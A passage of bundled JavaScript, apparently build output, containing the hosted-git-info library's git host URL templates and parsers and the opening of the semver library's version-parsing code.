      filetemplate: ({ auth, user, project, committish, path: path2 }) => `https://${maybeJoin(auth, "@")}raw.githubusercontent.com/${user}/${project}/${maybeEncode(committish || "HEAD")}/${path2}`,
      gittemplate: ({ auth, domain, user, project, committish }) => `git://${maybeJoin(auth, "@")}${domain}/${user}/${project}.git${maybeJoin("#", committish)}`,
      tarballtemplate: ({ domain, user, project, committish }) => `https://codeload.${domain}/${user}/${project}/tar.gz/${maybeEncode(committish || "HEAD")}`,
      extract: (url) => {
        let [, user, project, type, committish] = url.pathname.split("/", 5);
        if (type && type !== "tree") {
          return;
        }
        if (!type) {
          committish = url.hash.slice(1);
        }
        if (project && project.endsWith(".git")) {
          project = project.slice(0, -4);
        }
        if (!user || !project) {
          return;
        }
        return { user, project, committish };
      }
    };
    hosts.bitbucket = {
      protocols: ["git+ssh:", "git+https:", "ssh:", "https:"],
      domain: "bitbucket.org",
      treepath: "src",
      blobpath: "src",
      editpath: "?mode=edit",
      edittemplate: ({ domain, user, project, committish, treepath, path: path2, editpath }) => `https://${domain}/${user}/${project}${maybeJoin("/", treepath, "/", maybeEncode(committish || "HEAD"), "/", path2, editpath)}`,
      tarballtemplate: ({ domain, user, project, committish }) => `https://${domain}/${user}/${project}/get/${maybeEncode(committish || "HEAD")}.tar.gz`,
      extract: (url) => {
        let [, user, project, aux] = url.pathname.split("/", 4);
        if (["get"].includes(aux)) {
          return;
        }
        if (project && project.endsWith(".git")) {
          project = project.slice(0, -4);
        }
        if (!user || !project) {
          return;
        }
        return { user, project, committish: url.hash.slice(1) };
      }
    };
    hosts.gitlab = {
      protocols: ["git+ssh:", "git+https:", "ssh:", "https:"],
      domain: "gitlab.com",
      treepath: "tree",
      blobpath: "tree",
      editpath: "-/edit",
      tarballtemplate: ({ domain, user, project, committish }) => `https://${domain}/api/v4/projects/${maybeEncode(user + "/" + project)}/repository/archive.tar.gz?sha=${maybeEncode(committish || "HEAD")}`,
      extract: (url) => {
        const path2 = url.pathname.slice(1);
        if (path2.includes("/-/") || path2.includes("/archive.tar.gz")) {
          return;
        }
        const segments = path2.split("/");
        let project = segments.pop();
        if (project.endsWith(".git")) {
          project = project.slice(0, -4);
        }
        const user = segments.join("/");
        if (!user || !project) {
          return;
        }
        return { user, project, committish: url.hash.slice(1) };
      }
    };
    hosts.gist = {
      protocols: ["git:", "git+ssh:", "git+https:", "ssh:", "https:"],
      domain: "gist.github.com",
      editpath: "edit",
      sshtemplate: ({ domain, project, committish }) => `git@${domain}:${project}.git${maybeJoin("#", committish)}`,
      sshurltemplate: ({ domain, project, committish }) => `git+ssh://git@${domain}/${project}.git${maybeJoin("#", committish)}`,
      edittemplate: ({ domain, user, project, committish, editpath }) => `https://${domain}/${user}/${project}${maybeJoin("/", maybeEncode(committish))}/${editpath}`,
      browsetemplate: ({ domain, project, committish }) => `https://${domain}/${project}${maybeJoin("/", maybeEncode(committish))}`,
      browsetreetemplate: ({ domain, project, committish, path: path2, hashformat }) => `https://${domain}/${project}${maybeJoin("/", maybeEncode(committish))}${maybeJoin("#", hashformat(path2))}`,
      browseblobtemplate: ({ domain, project, committish, path: path2, hashformat }) => `https://${domain}/${project}${maybeJoin("/", maybeEncode(committish))}${maybeJoin("#", hashformat(path2))}`,
      docstemplate: ({ domain, project, committish }) => `https://${domain}/${project}${maybeJoin("/", maybeEncode(committish))}`,
      httpstemplate: ({ domain, project, committish }) => `git+https://${domain}/${project}.git${maybeJoin("#", committish)}`,
      filetemplate: ({ user, project, committish, path: path2 }) => `https://gist.githubusercontent.com/${user}/${project}/raw${maybeJoin("/", maybeEncode(committish))}/${path2}`,
      shortcuttemplate: ({ type, project, committish }) => `${type}:${project}${maybeJoin("#", committish)}`,
      pathtemplate: ({ project, committish }) => `${project}${maybeJoin("#", committish)}`,
      bugstemplate: ({ domain, project }) => `https://${domain}/${project}`,
      gittemplate: ({ domain, project, committish }) => `git://${domain}/${project}.git${maybeJoin("#", committish)}`,
      tarballtemplate: ({ project, committish }) => `https://codeload.github.com/gist/${project}/tar.gz/${maybeEncode(committish || "HEAD")}`,
      extract: (url) => {
        let [, user, project, aux] = url.pathname.split("/", 4);
        if (aux === "raw") {
          return;
        }
        if (!project) {
          if (!user) {
            return;
          }
          project = user;
          user = null;
        }
        if (project.endsWith(".git")) {
          project = project.slice(0, -4);
        }
        return { user, project, committish: url.hash.slice(1) };
      },
      hashformat: function(fragment) {
        return fragment && "file-" + formatHashFragment(fragment);
      }
    };
    hosts.sourcehut = {
      protocols: ["git+ssh:", "https:"],
      domain: "git.sr.ht",
      treepath: "tree",
      blobpath: "tree",
      filetemplate: ({ domain, user, project, committish, path: path2 }) => `https://${domain}/${user}/${project}/blob/${maybeEncode(committish) || "HEAD"}/${path2}`,
      httpstemplate: ({ domain, user, project, committish }) => `https://${domain}/${user}/${project}${maybeJoin("#", committish)}`,
      tarballtemplate: ({ domain, user, project, committish }) => `https://${domain}/${user}/${project}/archive/${maybeEncode(committish) || "HEAD"}.tar.gz`,
      bugstemplate: () => null,
      extract: (url) => {
        let [, user, project, aux] = url.pathname.split("/", 4);
        if (["archive"].includes(aux)) {
          return;
        }
        if (project && project.endsWith(".git")) {
          project = project.slice(0, -4);
        }
        if (!user || !project) {
          return;
        }
        return { user, project, committish: url.hash.slice(1) };
      }
    };
    for (const [name, host] of Object.entries(hosts)) {
      hosts[name] = Object.assign({}, defaults, host);
    }
    module2.exports = hosts;
  }
});

// node_modules/.pnpm/hosted-git-info@10.1.1/node_modules/hosted-git-info/lib/parse-url.js
var require_parse_url = __commonJS({
  "node_modules/.pnpm/hosted-git-info@10.1.1/node_modules/hosted-git-info/lib/parse-url.js"(exports2, module2) {
    var lastIndexOfBefore = (str, char, beforeChar) => {
      const startPosition = str.indexOf(beforeChar);
      return str.lastIndexOf(char, startPosition > -1 ? startPosition : Infinity);
    };
    var safeUrl = (u) => {
      try {
        return new URL(u);
      } catch {
      }
    };
    var correctProtocol = (arg, protocols) => {
      const firstColon = arg.indexOf(":");
      const proto = arg.slice(0, firstColon + 1);
      if (Object.prototype.hasOwnProperty.call(protocols, proto)) {
        return arg;
      }
      if (arg.substr(firstColon, 3) === "://") {
        return arg;
      }
      const firstAt = arg.indexOf("@");
      if (firstAt > -1) {
        if (firstAt > firstColon) {
          return `git+ssh://${arg}`;
        } else {
          return arg;
        }
      }
      return `${arg.slice(0, firstColon + 1)}//${arg.slice(firstColon + 1)}`;
    };
    var correctUrl = (giturl) => {
      const firstAt = lastIndexOfBefore(giturl, "@", "#");
      const lastColonBeforeHash = lastIndexOfBefore(giturl, ":", "#");
      if (lastColonBeforeHash > firstAt) {
        giturl = giturl.slice(0, lastColonBeforeHash) + "/" + giturl.slice(lastColonBeforeHash + 1);
      }
      if (lastIndexOfBefore(giturl, ":", "#") === -1 && giturl.indexOf("//") === -1) {
        giturl = `git+ssh://${giturl}`;
      }
      return giturl;
    };
    module2.exports = (giturl, protocols) => {
      const withProtocol = protocols ? correctProtocol(giturl, protocols) : giturl;
      return safeUrl(withProtocol) || safeUrl(correctUrl(withProtocol));
    };
  }
});

// node_modules/.pnpm/hosted-git-info@10.1.1/node_modules/hosted-git-info/lib/from-url.js
var require_from_url = __commonJS({
  "node_modules/.pnpm/hosted-git-info@10.1.1/node_modules/hosted-git-info/lib/from-url.js"(exports2, module2) {
    "use strict";
    var parseUrl = require_parse_url();
    var isGitHubShorthand = (arg) => {
      const firstHash = arg.indexOf("#");
      const firstSlash = arg.indexOf("/");
      const secondSlash = arg.indexOf("/", firstSlash + 1);
      const firstColon = arg.indexOf(":");
      const firstSpace = /\s/.exec(arg);
      const firstAt = arg.indexOf("@");
      const spaceOnlyAfterHash = !firstSpace || firstHash > -1 && firstSpace.index > firstHash;
      const atOnlyAfterHash = firstAt === -1 || firstHash > -1 && firstAt > firstHash;
      const colonOnlyAfterHash = firstColon === -1 || firstHash > -1 && firstColon > firstHash;
      const secondSlashOnlyAfterHash = secondSlash === -1 || firstHash > -1 && secondSlash > firstHash;
      const hasSlash = firstSlash > 0;
      const doesNotEndWithSlash = firstHash > -1 ? arg[firstHash - 1] !== "/" : !arg.endsWith("/");
      const doesNotStartWithDot = !arg.startsWith(".");
      return spaceOnlyAfterHash && hasSlash && doesNotEndWithSlash && doesNotStartWithDot && atOnlyAfterHash && colonOnlyAfterHash && secondSlashOnlyAfterHash;
    };
    module2.exports = (giturl, opts, { gitHosts, protocols }) => {
      if (!giturl) {
        return;
      }
      const correctedUrl = isGitHubShorthand(giturl) ? `github:${giturl}` : giturl;
      const parsed = parseUrl(correctedUrl, protocols);
      if (!parsed) {
        return;
      }
      const gitHostShortcut = gitHosts.byShortcut[parsed.protocol];
      const gitHostDomain = gitHosts.byDomain[parsed.hostname.startsWith("www.") ? parsed.hostname.slice(4) : parsed.hostname];
      const gitHostName = gitHostShortcut || gitHostDomain;
      if (!gitHostName) {
        return;
      }
      const gitHostInfo = gitHosts[gitHostShortcut || gitHostDomain];
      let auth = null;
      if (protocols[parsed.protocol]?.auth && (parsed.username || parsed.password)) {
        auth = `${parsed.username}${parsed.password ? ":" + parsed.password : ""}`;
      }
      let committish = null;
      let user = null;
      let project = null;
      let defaultRepresentation = null;
      try {
        if (gitHostShortcut) {
          let pathname = parsed.pathname.startsWith("/") ? parsed.pathname.slice(1) : parsed.pathname;
          const firstAt = pathname.indexOf("@");
          if (firstAt > -1) {
            pathname = pathname.slice(firstAt + 1);
          }
          const lastSlash = pathname.lastIndexOf("/");
          if (lastSlash > -1) {
            user = decodeURIComponent(pathname.slice(0, lastSlash));
            if (!user) {
              user = null;
            }
            project = decodeURIComponent(pathname.slice(lastSlash + 1));
          } else {
            project = decodeURIComponent(pathname);
          }
          if (project.endsWith(".git")) {
            project = project.slice(0, -4);
          }
          if (parsed.hash) {
            committish = decodeURIComponent(parsed.hash.slice(1));
          }
          defaultRepresentation = "shortcut";
        } else {
          if (!gitHostInfo.protocols.includes(parsed.protocol)) {
            return;
          }
          const segments = gitHostInfo.extract(parsed);
          if (!segments) {
            return;
          }
          user = segments.user && decodeURIComponent(segments.user);
          project = decodeURIComponent(segments.project);
          committish = decodeURIComponent(segments.committish);
          defaultRepresentation = protocols[parsed.protocol]?.name || parsed.protocol.slice(0, -1);
        }
      } catch (err) {
        if (err instanceof URIError) {
          return;
        } else {
          throw err;
        }
      }
      return [gitHostName, user, auth, project, committish, defaultRepresentation, opts];
    };
  }
});

// node_modules/.pnpm/hosted-git-info@10.1.1/node_modules/hosted-git-info/lib/index.js
var require_lib = __commonJS({
  "node_modules/.pnpm/hosted-git-info@10.1.1/node_modules/hosted-git-info/lib/index.js"(exports2, module2) {
    "use strict";
    var { LRUCache } = require_index_min();
    var hosts = require_hosts();
    var fromUrl = require_from_url();
    var parseUrl = require_parse_url();
    var cache = new LRUCache({ max: 1e3 });
    function unknownHostedUrl(url) {
      try {
        const {
          protocol,
          hostname,
          pathname
        } = new URL(url);
        if (!hostname) {
          return null;
        }
        const proto = /(?:git\+)http:$/.test(protocol) ? "http:" : "https:";
        const path2 = pathname.replace(/\.git$/, "");
        return `${proto}//${hostname}${path2}`;
      } catch {
        return null;
      }
    }
    var GitHost = class _GitHost {
      constructor(type, user, auth, project, committish, defaultRepresentation, opts = {}) {
        Object.assign(this, _GitHost.#gitHosts[type], {
          type,
          user,
          auth,
          project,
          committish,
          default: defaultRepresentation,
          opts
        });
      }
      static #gitHosts = { byShortcut: {}, byDomain: {} };
      static #protocols = {
        "git+ssh:": { name: "sshurl" },
        "ssh:": { name: "sshurl" },
        "git+https:": { name: "https", auth: true },
        "git:": { auth: true },
        "http:": { auth: true },
        "https:": { auth: true },
        "git+http:": { auth: true }
      };
      static addHost(name, host) {
        _GitHost.#gitHosts[name] = host;
        _GitHost.#gitHosts.byDomain[host.domain] = name;
        _GitHost.#gitHosts.byShortcut[`${name}:`] = name;
        _GitHost.#protocols[`${name}:`] = { name };
      }
      static fromUrl(giturl, opts) {
        if (typeof giturl !== "string") {
          return;
        }
        const key = giturl + JSON.stringify(opts || {});
        if (!cache.has(key)) {
          const hostArgs = fromUrl(giturl, opts, {
            gitHosts: _GitHost.#gitHosts,
            protocols: _GitHost.#protocols
          });
          cache.set(key, hostArgs ? new _GitHost(...hostArgs) : void 0);
        }
        return cache.get(key);
      }
      static fromManifest(manifest, opts = {}) {
        if (!manifest || typeof manifest !== "object") {
          return;
        }
        const r = manifest.repository;
        const rurl = r && (typeof r === "string" ? r : typeof r === "object" && typeof r.url === "string" ? r.url : null);
        if (!rurl) {
          throw new Error("no repository");
        }
        const info = rurl && _GitHost.fromUrl(rurl.replace(/^git\+/, ""), opts) || null;
        if (info) {
          return info;
        }
        const unk = unknownHostedUrl(rurl);
        return _GitHost.fromUrl(unk, opts) || unk;
      }
      static parseUrl(url) {
        return parseUrl(url);
      }
      #fill(template, opts) {
        if (typeof template !== "function") {
          return null;
        }
        const options = { ...this, ...this.opts, ...opts };
        if (!options.path) {
          options.path = "";
        }
        if (options.path.startsWith("/")) {
          options.path = options.path.slice(1);
        }
        if (options.noCommittish) {
          options.committish = null;
        }
        const result = template(options);
        return options.noGitPlus && result.startsWith("git+") ? result.slice(4) : result;
      }
      hash() {
        return this.committish ? `#${this.committish}` : "";
      }
      ssh(opts) {
        return this.#fill(this.sshtemplate, opts);
      }
      sshurl(opts) {
        return this.#fill(this.sshurltemplate, opts);
      }
      browse(path2, ...args) {
        if (typeof path2 !== "string") {
          return this.#fill(this.browsetemplate, path2);
        }
        if (typeof args[0] !== "string") {
          return this.#fill(this.browsetreetemplate, { ...args[0], path: path2 });
        }
        return this.#fill(this.browsetreetemplate, { ...args[1], fragment: args[0], path: path2 });
      }
      // If the path is known to be a file, then browseFile should be used. For some hosts
      // the url is the same as browse, but for others like GitHub a file can use both `/tree/`
      // and `/blob/` in the path. When using a default committish of `HEAD` then the `/tree/`
      // path will redirect to a specific commit. Using the `/blob/` path avoids this and
      // does not redirect to a different commit.
      browseFile(path2, ...args) {
        if (typeof args[0] !== "string") {
          return this.#fill(this.browseblobtemplate, { ...args[0], path: path2 });
        }
        return this.#fill(this.browseblobtemplate, { ...args[1], fragment: args[0], path: path2 });
      }
      docs(opts) {
        return this.#fill(this.docstemplate, opts);
      }
      bugs(opts) {
        return this.#fill(this.bugstemplate, opts);
      }
      https(opts) {
        return this.#fill(this.httpstemplate, opts);
      }
      git(opts) {
        return this.#fill(this.gittemplate, opts);
      }
      shortcut(opts) {
        return this.#fill(this.shortcuttemplate, opts);
      }
      path(opts) {
        return this.#fill(this.pathtemplate, opts);
      }
      tarball(opts) {
        return this.#fill(this.tarballtemplate, { ...opts, noCommittish: false });
      }
      file(path2, opts) {
        return this.#fill(this.filetemplate, { ...opts, path: path2 });
      }
      edit(path2, opts) {
        return this.#fill(this.edittemplate, { ...opts, path: path2 });
      }
      getDefaultRepresentation() {
        return this.default;
      }
      toString(opts) {
        if (this.default && typeof this[this.default] === "function") {
          return this[this.default](opts);
        }
        return this.sshurl(opts);
      }
    };
    for (const [name, host] of Object.entries(hosts)) {
      GitHost.addHost(name, host);
    }
    module2.exports = GitHost;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/constants.js
var require_constants = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/constants.js"(exports2, module2) {
    "use strict";
    var SEMVER_SPEC_VERSION = "2.0.0";
    var MAX_LENGTH = 256;
    var MAX_SAFE_INTEGER = Number.MAX_SAFE_INTEGER || /* istanbul ignore next */
    9007199254740991;
    var MAX_SAFE_COMPONENT_LENGTH = 16;
    var MAX_SAFE_BUILD_LENGTH = MAX_LENGTH - 6;
    var RELEASE_TYPES = [
      "major",
      "premajor",
      "minor",
      "preminor",
      "patch",
      "prepatch",
      "prerelease"
    ];
    module2.exports = {
      MAX_LENGTH,
      MAX_SAFE_COMPONENT_LENGTH,
      MAX_SAFE_BUILD_LENGTH,
      MAX_SAFE_INTEGER,
      RELEASE_TYPES,
      SEMVER_SPEC_VERSION,
      FLAG_INCLUDE_PRERELEASE: 1,
      FLAG_LOOSE: 2
    };
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/debug.js
var require_debug = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/debug.js"(exports2, module2) {
    "use strict";
    var debug = typeof process === "object" && process.env && process.env.NODE_DEBUG && /\bsemver\b/i.test(process.env.NODE_DEBUG) ? (...args) => console.error("SEMVER", ...args) : () => {
    };
    module2.exports = debug;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/re.js
var require_re = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/re.js"(exports2, module2) {
    "use strict";
    var {
      MAX_SAFE_COMPONENT_LENGTH,
      MAX_SAFE_BUILD_LENGTH,
      MAX_LENGTH
    } = require_constants();
    var debug = require_debug();
    exports2 = module2.exports = {};
    var re = exports2.re = [];
    var safeRe = exports2.safeRe = [];
    var src = exports2.src = [];
    var safeSrc = exports2.safeSrc = [];
    var t = exports2.t = {};
    var R = 0;
    var LETTERDASHNUMBER = "[a-zA-Z0-9-]";
    var safeRegexReplacements = [
      ["\\s", 1],
      ["\\d", MAX_LENGTH],
      [LETTERDASHNUMBER, MAX_SAFE_BUILD_LENGTH]
    ];
    var makeSafeRegex = (value) => {
      for (const [token, max] of safeRegexReplacements) {
        value = value.split(`${token}*`).join(`${token}{0,${max}}`).split(`${token}+`).join(`${token}{1,${max}}`);
      }
      return value;
    };
    var createToken = (name, value, isGlobal) => {
      const safe = makeSafeRegex(value);
      const index = R++;
      debug(name, index, value);
      t[name] = index;
      src[index] = value;
      safeSrc[index] = safe;
      re[index] = new RegExp(value, isGlobal ? "g" : void 0);
      safeRe[index] = new RegExp(safe, isGlobal ? "g" : void 0);
    };
    createToken("NUMERICIDENTIFIER", "0|[1-9]\\d*");
    createToken("NUMERICIDENTIFIERLOOSE", "\\d+");
    createToken("NONNUMERICIDENTIFIER", `\\d*[a-zA-Z-]${LETTERDASHNUMBER}*`);
    createToken("MAINVERSION", `(${src[t.NUMERICIDENTIFIER]})\\.(${src[t.NUMERICIDENTIFIER]})\\.(${src[t.NUMERICIDENTIFIER]})`);
    createToken("MAINVERSIONLOOSE", `(${src[t.NUMERICIDENTIFIERLOOSE]})\\.(${src[t.NUMERICIDENTIFIERLOOSE]})\\.(${src[t.NUMERICIDENTIFIERLOOSE]})`);
    createToken("PRERELEASEIDENTIFIER", `(?:${src[t.NONNUMERICIDENTIFIER]}|${src[t.NUMERICIDENTIFIER]})`);
    createToken("PRERELEASEIDENTIFIERLOOSE", `(?:${src[t.NONNUMERICIDENTIFIER]}|${src[t.NUMERICIDENTIFIERLOOSE]})`);
    createToken("PRERELEASE", `(?:-(${src[t.PRERELEASEIDENTIFIER]}(?:\\.${src[t.PRERELEASEIDENTIFIER]})*))`);
    createToken("PRERELEASELOOSE", `(?:-?(${src[t.PRERELEASEIDENTIFIERLOOSE]}(?:\\.${src[t.PRERELEASEIDENTIFIERLOOSE]})*))`);
    createToken("BUILDIDENTIFIER", `${LETTERDASHNUMBER}+`);
    createToken("BUILD", `(?:\\+(${src[t.BUILDIDENTIFIER]}(?:\\.${src[t.BUILDIDENTIFIER]})*))`);
    createToken("FULLPLAIN", `v?${src[t.MAINVERSION]}${src[t.PRERELEASE]}?${src[t.BUILD]}?`);
    createToken("FULL", `^${src[t.FULLPLAIN]}$`);
    createToken("LOOSEPLAIN", `[v=\\s]*${src[t.MAINVERSIONLOOSE]}${src[t.PRERELEASELOOSE]}?${src[t.BUILD]}?`);
    createToken("LOOSE", `^${src[t.LOOSEPLAIN]}$`);
    createToken("GTLT", "((?:<|>)?=?)");
    createToken("XRANGEIDENTIFIERLOOSE", `${src[t.NUMERICIDENTIFIERLOOSE]}|x|X|\\*`);
    createToken("XRANGEIDENTIFIER", `${src[t.NUMERICIDENTIFIER]}|x|X|\\*`);
    createToken("XRANGEPLAIN", `[v=\\s]*(${src[t.XRANGEIDENTIFIER]})(?:\\.(${src[t.XRANGEIDENTIFIER]})(?:\\.(${src[t.XRANGEIDENTIFIER]})(?:${src[t.PRERELEASE]})?${src[t.BUILD]}?)?)?`);
    createToken("XRANGEPLAINLOOSE", `[v=\\s]*(${src[t.XRANGEIDENTIFIERLOOSE]})(?:\\.(${src[t.XRANGEIDENTIFIERLOOSE]})(?:\\.(${src[t.XRANGEIDENTIFIERLOOSE]})(?:${src[t.PRERELEASELOOSE]})?${src[t.BUILD]}?)?)?`);
    createToken("XRANGE", `^${src[t.GTLT]}\\s*${src[t.XRANGEPLAIN]}$`);
    createToken("XRANGELOOSE", `^${src[t.GTLT]}\\s*${src[t.XRANGEPLAINLOOSE]}$`);
    createToken("COERCEPLAIN", `${"(^|[^\\d])(\\d{1,"}${MAX_SAFE_COMPONENT_LENGTH}})(?:\\.(\\d{1,${MAX_SAFE_COMPONENT_LENGTH}}))?(?:\\.(\\d{1,${MAX_SAFE_COMPONENT_LENGTH}}))?`);
    createToken("COERCE", `${src[t.COERCEPLAIN]}(?:$|[^\\d])`);
    createToken("COERCEFULL", src[t.COERCEPLAIN] + `(?:${src[t.PRERELEASE]})?(?:${src[t.BUILD]})?(?:$|[^\\d])`);
    createToken("COERCERTL", src[t.COERCE], true);
    createToken("COERCERTLFULL", src[t.COERCEFULL], true);
    createToken("LONETILDE", "(?:~>?)");
    createToken("TILDETRIM", `(\\s*)${src[t.LONETILDE]}\\s+`, true);
    exports2.tildeTrimReplace = "$1~";
    createToken("TILDE", `^${src[t.LONETILDE]}${src[t.XRANGEPLAIN]}$`);
    createToken("TILDELOOSE", `^${src[t.LONETILDE]}${src[t.XRANGEPLAINLOOSE]}$`);
    createToken("LONECARET", "(?:\\^)");
    createToken("CARETTRIM", `(\\s*)${src[t.LONECARET]}\\s+`, true);
    exports2.caretTrimReplace = "$1^";
    createToken("CARET", `^${src[t.LONECARET]}${src[t.XRANGEPLAIN]}$`);
    createToken("CARETLOOSE", `^${src[t.LONECARET]}${src[t.XRANGEPLAINLOOSE]}$`);
    createToken("COMPARATORLOOSE", `^${src[t.GTLT]}\\s*(${src[t.LOOSEPLAIN]})$|^$`);
    createToken("COMPARATOR", `^${src[t.GTLT]}\\s*(${src[t.FULLPLAIN]})$|^$`);
    createToken("COMPARATORTRIM", `(\\s*)${src[t.GTLT]}\\s*(${src[t.LOOSEPLAIN]}|${src[t.XRANGEPLAIN]})`, true);
    exports2.comparatorTrimReplace = "$1$2$3";
    createToken("HYPHENRANGE", `^\\s*(${src[t.XRANGEPLAIN]})\\s+-\\s+(${src[t.XRANGEPLAIN]})\\s*$`);
    createToken("HYPHENRANGELOOSE", `^\\s*(${src[t.XRANGEPLAINLOOSE]})\\s+-\\s+(${src[t.XRANGEPLAINLOOSE]})\\s*$`);
    createToken("STAR", "(<|>)?=?\\s*\\*");
    createToken("GTE0", "^\\s*>=\\s*0\\.0\\.0\\s*$");
    createToken("GTE0PRE", "^\\s*>=\\s*0\\.0\\.0-0\\s*$");
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/parse-options.js
var require_parse_options = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/parse-options.js"(exports2, module2) {
    "use strict";
    var looseOption = Object.freeze({ loose: true });
    var emptyOpts = Object.freeze({});
    var parseOptions = (options) => {
      if (!options) {
        return emptyOpts;
      }
      if (typeof options !== "object") {
        return looseOption;
      }
      return options;
    };
    module2.exports = parseOptions;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/identifiers.js
var require_identifiers = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/identifiers.js"(exports2, module2) {
    "use strict";
    var numeric = /^[0-9]+$/;
    var compareIdentifiers = (a, b) => {
      if (typeof a === "number" && typeof b === "number") {
        return a === b ? 0 : a < b ? -1 : 1;
      }
      const anum = numeric.test(a);
      const bnum = numeric.test(b);
      if (anum && bnum) {
        a = +a;
        b = +b;
      }
      return a === b ? 0 : anum && !bnum ? -1 : bnum && !anum ? 1 : a < b ? -1 : 1;
    };
    var rcompareIdentifiers = (a, b) => compareIdentifiers(b, a);
    module2.exports = {
      compareIdentifiers,
      rcompareIdentifiers
    };
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/classes/semver.js
var require_semver = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/classes/semver.js"(exports2, module2) {
    "use strict";
    var debug = require_debug();
    var { MAX_LENGTH, MAX_SAFE_INTEGER } = require_constants();
    var { safeRe: re, t } = require_re();
    var parseOptions = require_parse_options();
    var { compareIdentifiers } = require_identifiers();
    var isPrereleaseIdentifier = (prerelease, identifier) => {
      const identifiers = identifier.split(".");
      if (identifiers.length > prerelease.length) {
        return false;
      }
      for (let i = 0; i < identifiers.length; i++) {
        if (compareIdentifiers(prerelease[i], identifiers[i]) !== 0) {
          return false;
        }
      }
      return true;
    };
    var SemVer = class _SemVer {
      constructor(version, options) {
        options = parseOptions(options);
        if (version instanceof _SemVer) {
          if (version.loose === !!options.loose && version.includePrerelease === !!options.includePrerelease) {
            return version;
          } else {
            version = version.version;
          }
        } else if (typeof version !== "string") {
          throw new TypeError(`Invalid version. Must be a string. Got type "${typeof version}".`);
        }
        if (version.length > MAX_LENGTH) {
          throw new TypeError(
            `version is longer than ${MAX_LENGTH} characters`
          );
        }
        debug("SemVer", version, options);
        this.options = options;
        this.loose = !!options.loose;
        this.includePrerelease = !!options.includePrerelease;
        const m = version.trim().match(options.loose ? re[t.LOOSE] : re[t.FULL]);
        if (!m) {
          throw new TypeError(`Invalid Version: ${version}`);
        }
        this.raw = version;
        this.major = +m[1];
        this.minor = +m[2];
        this.patch = +m[3];
        if (this.major > MAX_SAFE_INTEGER || this.major < 0) {
          throw new TypeError("Invalid major version");
        }
        if (this.minor > MAX_SAFE_INTEGER || this.minor < 0) {
          throw new TypeError("Invalid minor version");
        }
        if (this.patch > MAX_SAFE_INTEGER || this.patch < 0) {
          throw new TypeError("Invalid patch version");
        }
        if (!m[4]) {
          this.prerelease = [];
        } else {
          this.prerelease = m[4].split(".").map((id) => {
            if (/^[0-9]+$/.test(id)) {
              const num = +id;
              if (num >= 0 && num < MAX_SAFE_INTEGER) {
                return num;
              }
            }
            return id;
          });
        }
        this.build = m[5] ? m[5].split(".") : [];
        this.format();
      }
      format() {
        this.version = `${this.major}.${this.minor}.${this.patch}`;
        if (this.prerelease.length) {
          this.version += `-${this.prerelease.join(".")}`;
        }
        return this.version;
      }
      toString() {
        return this.version;
      }
      compare(other) {
        debug("SemVer.compare", this.version, this.options, other);
        if (!(other instanceof _SemVer)) {
          if (typeof other === "string" && other === this.version) {
            return 0;
          }
          other = new _SemVer(other, this.options);
        }
        if (other.version === this.version) {
          return 0;
        }
        return this.compareMain(other) || this.comparePre(other);
      }
      compareMain(other) {
        if (!(other instanceof _SemVer)) {
          other = new _SemVer(other, this.options);
        }
        if (this.major < other.major) {
          return -1;
        }
        if (this.major > other.major) {
          return 1;
        }
        if (this.minor < other.minor) {
          return -1;
        }
        if (this.minor > other.minor) {
          return 1;
        }
        if (this.patch < other.patch) {
          return -1;
        }
        if (this.patch > other.patch) {
          return 1;
        }
        return 0;
      }
      comparePre(other) {
        if (!(other instanceof _SemVer)) {
          other = new _SemVer(other, this.options);
        }
        if (this.prerelease.length && !other.prerelease.length) {
          return -1;
        } else if (!this.prerelease.length && other.prerelease.length) {
          return 1;
        } else if (!this.prerelease.length && !other.prerelease.length) {
          return 0;
        }
        let i = 0;
        do {
          const a = this.prerelease[i];
          const b = other.prerelease[i];
          debug("prerelease compare", i, a, b);
          if (a === void 0 && b === void 0) {
            return 0;
          } else if (b === void 0) {
            return 1;
          } else if (a === void 0) {
            return -1;
          } else if (a === b) {
            continue;
          } else {
            return compareIdentifiers(a, b);
          }
        } while (++i);
      }
      compareBuild(other) {
        if (!(other instanceof _SemVer)) {
          other = new _SemVer(other, this.options);
        }
        let i = 0;
        do {
          const a = this.build[i];
          const b = other.build[i];
          debug("build compare", i, a, b);
          if (a === void 0 && b === void 0) {
            return 0;
          } else if (b === void 0) {
            return 1;
          } else if (a === void 0) {
            return -1;
          } else if (a === b) {
            continue;
          } else {
            return compareIdentifiers(a, b);
          }
        } while (++i);
      }
      // preminor will bump the version up to the next minor release, and immediately
      // down to pre-release. premajor and prepatch work the same way.
      inc(release, identifier, identifierBase) {
        if (release.startsWith("pre")) {
          if (!identifier && identifierBase === false) {
            throw new Error("invalid increment argument: identifier is empty");
          }
          if (identifier) {
            const match = `-${identifier}`.match(this.options.loose ? re[t.PRERELEASELOOSE] : re[t.PRERELEASE]);
            if (!match || match[1] !== identifier) {
              throw new Error(`invalid identifier: ${identifier}`);
            }
          }
        }
        switch (release) {
          case "premajor":
            this.prerelease.length = 0;
            this.patch = 0;
            this.minor = 0;
            this.major++;
            this.inc("pre", identifier, identifierBase);
            break;
          case "preminor":
            this.prerelease.length = 0;
            this.patch = 0;
            this.minor++;
            this.inc("pre", identifier, identifierBase);
            break;
          case "prepatch":
            this.prerelease.length = 0;
            this.inc("patch", identifier, identifierBase);
            this.inc("pre", identifier, identifierBase);
            break;
          // If the input is a non-prerelease version, this acts the same as
          // prepatch.
          case "prerelease":
            if (this.prerelease.length === 0) {
              this.inc("patch", identifier, identifierBase);
            }
            this.inc("pre", identifier, identifierBase);
            break;
          case "release":
            if (this.prerelease.length === 0) {
              throw new Error(`version ${this.raw} is not a prerelease`);
            }
            this.prerelease.length = 0;
            break;
          case "major":
            if (this.minor !== 0 || this.patch !== 0 || this.prerelease.length === 0) {
              this.major++;
            }
            this.minor = 0;
            this.patch = 0;
